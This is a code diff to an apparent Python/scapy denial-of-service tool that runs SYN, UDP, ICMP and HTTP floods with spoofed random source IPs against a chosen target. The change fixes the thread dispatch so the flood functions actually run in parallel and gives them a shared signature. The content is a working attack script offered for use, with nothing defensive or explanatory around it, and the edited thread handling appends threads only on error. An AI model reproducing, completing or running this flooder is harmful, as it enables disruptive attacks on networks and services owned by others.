@@ -26,22 +26,25 @@ def main():
     repeat = args.repeat
 
     if args.SynFlood:
-        target = SynFlood(dstIP, dstPort, 10)
+        target = SynFlood
     elif args.UDPFlood:
-        target = UDPFlood(dstIP, 10)
+        target = UDPFlood
     elif args.ICMPFlood:
-        target = ICMPFlood(dstIP, 10)
+        target = ICMPFlood
     elif args.HTTPFlood:
-        target = HTTPFlood(dstIP, dstPort, 10)
+        target = HTTPFlood
     else:
         print("Attack Type is Missing")
         return
     
     threads =[]
     for _ in range(int(repeat)):
-        t = threading.Thread(target=target)
-        t.start()
-        threads.append(t)
+        t = threading.Thread(target=target,args=(dstIP,dstPort,repeat))
+        try:
+            t.start()
+        except:
+            print("Error Occured")
+            threads.append(t)
     for thread in threads:
         thread.join()
 
@@ -87,7 +90,7 @@ def HTTPFlood(dstIP,dstPort,repeat):
     getStr='GET / HTTP/1.0\n\n'
     sr1(IP_Packet/TCP_Packet/getStr)
 
-def UDPFlood(dstIP,repeat):
+def UDPFlood(dstIP,dstPort,repeat):
     for x in range(int(repeat)):
         IP_Packet = IP()
         IP_Packet.src = randomSrcIP()
@@ -97,7 +100,7 @@ def UDPFlood(dstIP,repeat):
         UDP_Packet.dport = randomPort()
         send(IP_Packet/UDP_Packet/Raw(load=data))
 
-def ICMPFlood(dstIP,repeat):
+def ICMPFlood(dstIP,dstPort,repeat):
     
     for x in range(int(repeat)):
         IP_Packet = IP()
